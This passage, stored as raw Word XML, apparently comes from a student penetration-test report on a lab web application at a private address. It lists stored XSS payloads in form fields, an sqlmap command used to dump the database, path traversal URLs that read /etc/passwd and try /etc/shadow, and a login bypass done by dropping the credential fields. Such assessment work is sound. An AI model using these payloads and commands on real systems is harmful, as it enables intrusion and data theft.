          <w:p w14:paraId="4B54F794" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00C83DB6" w:rsidP="00E34950">
            <w:r>
              <w:t>N/A</w:t>
            </w:r>
            <w:r w:rsidR="003342CF">
              <w:t>*</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="43CF8F9D" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6526" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="52EA26A0" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>http://192.168.1.20/partyhalls.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7BD8B61E" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="7F7DE8B4" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="0CC55779" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r>
              <w:t>name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="09B983D8" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>&lt;/option&gt;&lt;script&gt;alert(</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidRPr="0032101B">
              <w:t>);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2D03A281" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00C83DB6" w:rsidP="00E34950">
            <w:r>
              <w:t>N/A</w:t>
            </w:r>
            <w:r w:rsidR="003342CF">
              <w:t>*</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="66852067" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6526" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="1C554A4A" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>http://192.168.1.20/inbox.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="0F0FA6F8" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="773744E9" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1C3904FC" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r>
              <w:t>txtmessage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5280EACC" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>&lt;/td&gt;&lt;script&gt;alert(</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidRPr="0032101B">
              <w:t>);&lt;/script&gt;&lt;td&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="36BC773E" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00C83DB6" w:rsidP="00E34950">
            <w:r>
              <w:t>7.9</w:t>
            </w:r>
            <w:r w:rsidR="003342CF">
              <w:t>***</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="58850542" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1E5B921D" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r>
              <w:t>subject</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3A011291" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>&lt;/td&gt;&lt;script&gt;alert(</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidRPr="0032101B">
              <w:t>);&lt;/script&gt;&lt;td&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="563208B6" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00C83DB6" w:rsidP="00E34950">
            <w:r>
              <w:t>7.10</w:t>
            </w:r>
            <w:r w:rsidR="003342CF">
              <w:t>***</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="13318417" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6526" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="02279856" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950">
            <w:r w:rsidRPr="0032101B">
              <w:t>http://192.168.1.20/foodzone.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="440BC92C" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00E34950"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD645A" w14:paraId="48212C77" w14:textId="77777777" w:rsidTr="00CD645A">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="992" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1276" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6DA52E6F" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="00CD645A" w:rsidP="00F40A2C">
            <w:r>
              <w:t>name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="74F34E7C" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00CD645A" w:rsidP="00F40A2C">
            <w:r w:rsidRPr="0032101B">
              <w:t>&lt;/option&gt;&lt;script&gt;alert(</w:t>
            </w:r>
            <w:r w:rsidR="00C83DB6">
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidRPr="0032101B">
              <w:t>);&lt;/script&gt;&lt;option&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1979" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3516D61F" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="0032101B" w:rsidRDefault="00C83DB6" w:rsidP="00F40A2C">
            <w:r>
              <w:t>N/A</w:t>
            </w:r>
            <w:r w:rsidR="003342CF">
              <w:t>*</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3BB3BCD4" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRDefault="003342CF" w:rsidP="003342CF">
      <w:pPr>
        <w:spacing w:before="120"/>
        <w:ind w:left="709"/>
      </w:pPr>
      <w:r>
        <w:t>*</w:t>
      </w:r>
      <w:r w:rsidR="00C83DB6">
        <w:t xml:space="preserve">N/A are representative of a submission </w:t>
      </w:r>
      <w:r>
        <w:t>where</w:t>
      </w:r>
      <w:r w:rsidR="00C83DB6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CD645A">
        <w:t>ZAP ma</w:t>
      </w:r>
      <w:r w:rsidR="00C83DB6">
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>es an</w:t>
      </w:r>
      <w:r w:rsidR="00CD645A">
        <w:t xml:space="preserve"> assumption about the structure of the web application</w:t>
      </w:r>
      <w:r w:rsidR="00F70916">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t>**</w:t>
      </w:r>
      <w:r w:rsidR="00F70916">
        <w:t>Others only ran in the admin section of the webpage and so could not be verified by the user but still worked.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ***Some also need to be ran on the admin page but then run on the user account.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795FE48F" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="000F10C3" w:rsidP="002027D4">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Because it was </w:t>
      </w:r>
      <w:r w:rsidR="00CB5947">
        <w:t>determined that the website was vulnerable to SQL Injection, XSS and Response Injection, Path Traversal and Script Injection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB5947">
        <w:t xml:space="preserve">on a number of different pages throughout the website </w:t>
      </w:r>
      <w:r>
        <w:t>it can be determined that this is no</w:t>
      </w:r>
      <w:r w:rsidR="00EB5A9E">
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> an</w:t>
      </w:r>
      <w:r w:rsidR="00CB5947">
        <w:t xml:space="preserve"> isolated incident or a </w:t>
      </w:r>
      <w:r w:rsidR="00807A49">
        <w:t>one-off</w:t>
      </w:r>
      <w:r w:rsidR="00CB5947">
        <w:t xml:space="preserve"> mistake.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED03017" w14:textId="77777777" w:rsidR="00085A03" w:rsidRDefault="00085A03" w:rsidP="002027D4">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Due to the fact that the script alerts</w:t>
      </w:r>
      <w:r w:rsidR="003342CF">
        <w:t>, such as the one below,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> remain even when reloaded, it can be concluded that the web application is vulnerable to persistent cross site scripts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D1E328" w14:textId="77777777" w:rsidR="00EB5A9E" w:rsidRDefault="00EB5A9E" w:rsidP="00085A03">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="023B1E04" wp14:editId="30FB321B">
            <wp:extent cx="2884304" cy="82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1228" cy="850776"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="660458A9" w14:textId="77777777" w:rsidR="00017880" w:rsidRDefault="00017880" w:rsidP="00017880">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>When the web application was determined to have SQL injection vulnerabilities the SQLmap tool was used to exfiltrate data from the database. Using the following command SQLmap used SQL injection to force the output of the database information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCA3126" w14:textId="77777777" w:rsidR="00017880" w:rsidRDefault="000F10C3" w:rsidP="00AC5E74">
      <w:pPr>
        <w:pBdr>
          <w:between w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bar w:val="single" w:sz="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:left="578" w:firstLine="130"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC5E74">
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>sqlmap -r /root/Desktop/login.txt --dbms=MySQL --current-user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACC4BE9" w14:textId="77777777" w:rsidR="00017880" w:rsidRDefault="00017880" w:rsidP="00017880">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:r w:rsidR="000F10C3">
        <w:t>a series of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00383179">
        <w:t xml:space="preserve">SQL </w:t>
      </w:r>
      <w:r>
        <w:t>command</w:t>
      </w:r>
      <w:r w:rsidR="000F10C3">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00383179">
        <w:t xml:space="preserve"> it is possible to exfiltrate a full picture of the database. It became apparent that other databases linked to different sites can be accessed from here as well suggesting a wider vulnerability. Therefore, for the purposes of this whitebox, only the information relating to this site has been included and can be</w:t>
      </w:r>
      <w:r w:rsidR="000F10C3">
        <w:t xml:space="preserve"> found in </w:t>
      </w:r>
      <w:r w:rsidR="000F10C3" w:rsidRPr="003342CF">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="003342CF">
        <w:t xml:space="preserve"> 7.11</w:t>
      </w:r>
      <w:r w:rsidR="00383179">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A88D99A" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="004C3C01" w:rsidP="00CD4824">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00EF0C8C">
        <w:t>Looking at the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> active Zap scan </w:t>
      </w:r>
      <w:r w:rsidR="00EF0C8C">
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> there </w:t>
      </w:r>
      <w:r w:rsidR="00EF0C8C">
        <w:t>was the ability to use path traversal on the directory:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F10A603" w14:textId="77777777" w:rsidR="00EF0C8C" w:rsidRDefault="00EF0C8C" w:rsidP="00CD4824">
      <w:pPr>
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00AC5E74">
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>http://192.168.1.20/attachment.php?type=%2Fetc%2Fpasswd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBD9C5B" w14:textId="77777777" w:rsidR="003A6CCD" w:rsidRDefault="003A6CCD" w:rsidP="003A6CCD">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2FBE078F" wp14:editId="2834C9F3">
            <wp:extent cx="5071871" cy="1141171"/>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2338" cy="1157026"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31240BAD" w14:textId="77777777" w:rsidR="00EF0C8C" w:rsidRDefault="003A6CCD" w:rsidP="00AC5E74">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>However, while this worked for this file,</w:t>
      </w:r>
      <w:r w:rsidR="00AC5E74">
        <w:t xml:space="preserve"> this did not allow for the shadow file to be opened as the permissions where properly set on that file as can be seen from the attempt below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE0C3AA" w14:textId="77777777" w:rsidR="00AC5E74" w:rsidRDefault="00AC5E74" w:rsidP="00AC5E74">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC5E74">
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>http://192.168.1.20/attachment.php?type=%2Fetc%2Fshadow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBF261A" w14:textId="77777777" w:rsidR="00EF0C8C" w:rsidRDefault="00EF0C8C" w:rsidP="00EF0C8C">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C343052" wp14:editId="492E6060">
            <wp:extent cx="5073094" cy="1181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3791" cy="126091"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="03258904" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22" w:rsidP="00EF0C8C">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52062290" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00257FFB" w:rsidP="00257FFB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="_Toc58836598"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure: Test For Logic Flaws</w:t>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
    </w:p>
    <w:p w14:paraId="5068CC6D" w14:textId="77777777" w:rsidR="00390EDA" w:rsidRDefault="00A55FE8" w:rsidP="00390EDA">
      <w:r>
        <w:t>Logic flaws are most likely to provide a vector of attack when present in something like a login or registration, that is why those forms will be most heavily scrutinized in this section. However, other areas also may provide opportunities to exploit the web application through some sort of improper handling of unexpected data, and those too will be looked at carefully.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F774178" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRPr="00390EDA" w:rsidRDefault="002A1D22" w:rsidP="00390EDA"/>
    <w:p w14:paraId="7D178A8E" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00D12877" w:rsidP="00D12877">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="_Toc58836599"/>
      <w:r>
        <w:t>Identify the Key Attack Surface</w:t>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
    </w:p>
    <w:p w14:paraId="0B2B745B" w14:textId="77777777" w:rsidR="00D12877" w:rsidRDefault="00D12877" w:rsidP="00791EC4">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are no multistage </w:t>
      </w:r>
      <w:r w:rsidR="00375EBE">
        <w:t>processes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB1327">
        <w:t xml:space="preserve">or guest accounts </w:t>
      </w:r>
      <w:r>
        <w:t>on this website</w:t>
      </w:r>
      <w:r w:rsidR="006A00E9">
        <w:t xml:space="preserve">, however, there </w:t>
      </w:r>
      <w:r w:rsidR="00791EC4">
        <w:t>is a login function and the ability to add additional quantity of items to the basket. These both provide possible areas of attack on the web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1B89D2" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22" w:rsidP="00791EC4">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4483110F" w14:textId="77777777" w:rsidR="00D12877" w:rsidRDefault="00D12877" w:rsidP="00D12877">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="48" w:name="_Toc58836600"/>
      <w:r>
        <w:t>Test Handling of Incomplete Input</w:t>
      </w:r>
      <w:bookmarkEnd w:id="48"/>
    </w:p>
    <w:p w14:paraId="73324922" w14:textId="77777777" w:rsidR="00CB1327" w:rsidRPr="00CB1327" w:rsidRDefault="00CB1327" w:rsidP="00CB1327">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In order to determine if incomplete inputs are properly handled by the web application a request was complied with the Login and Password </w:t>
      </w:r>
      <w:r w:rsidR="0048297F">
        <w:t>parameters</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> missing so that only the Submit parameter was sent as can be seen below:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="817" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2317"/>
        <w:gridCol w:w="3122"/>
        <w:gridCol w:w="3094"/>
      </w:tblGrid>
      <w:tr w:rsidR="00791EC4" w14:paraId="40CA4F01" w14:textId="77777777" w:rsidTr="00CB1327">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2375" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6B2C91A3" w14:textId="77777777" w:rsidR="00791EC4" w:rsidRDefault="00791EC4" w:rsidP="00E645F1">
            <w:r>
              <w:t>Remove name and password fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3192" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="27DC16D3" w14:textId="77777777" w:rsidR="00791EC4" w:rsidRDefault="00791EC4" w:rsidP="00E645F1">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1334319F" wp14:editId="54606612">
                  <wp:extent cx="866775" cy="161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6775" cy="161925"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3192" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="416452D3" w14:textId="77777777" w:rsidR="00791EC4" w:rsidRDefault="00791EC4" w:rsidP="00E645F1">
            <w:r>
              <w:t>Positive, Login to default user</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C45B7D9" w14:textId="77777777" w:rsidR="00D12877" w:rsidRDefault="00CB1327" w:rsidP="00AC7A5E">
      <w:pPr>
        <w:spacing w:before="120"/>
        <w:ind w:left="703"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This resulted in the attacker being logged in as </w:t>
      </w:r>
      <w:r w:rsidR="003A6CCD">
        <w:t>the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> user</w:t>
      </w:r>
      <w:r w:rsidR="003A6CCD">
        <w:t xml:space="preserve"> with blank name and password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, because they are not </w:t>
      </w:r>
      <w:r w:rsidR="003A6CCD">
        <w:t>received,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> they are assumed to be blank. This means that this cannot be used to login to any </w:t>
      </w:r>
      <w:r w:rsidR="0048297F">
        <w:t>other user accounts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AADB8C" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22" w:rsidP="00AC7A5E">
      <w:pPr>
        <w:spacing w:before="120"/>
        <w:ind w:left="703"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AB549EB" w14:textId="77777777" w:rsidR="00D12877" w:rsidRDefault="00D12877" w:rsidP="00D12877">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="_Toc58836601"/>
      <w:r>
        <w:t>Test Transaction Logic</w:t>
      </w:r>
      <w:bookmarkEnd w:id="49"/>
    </w:p>
    <w:p w14:paraId="17E1C831" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="003A6CCD" w:rsidP="0048297F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="0048297F">
        <w:t>hen the submission shown below was edited</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="0048297F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="0048297F">
        <w:t xml:space="preserve">o permutation of any of these numbers being edited resulted in </w:t>
      </w:r>
      <w:r w:rsidR="008A4696">
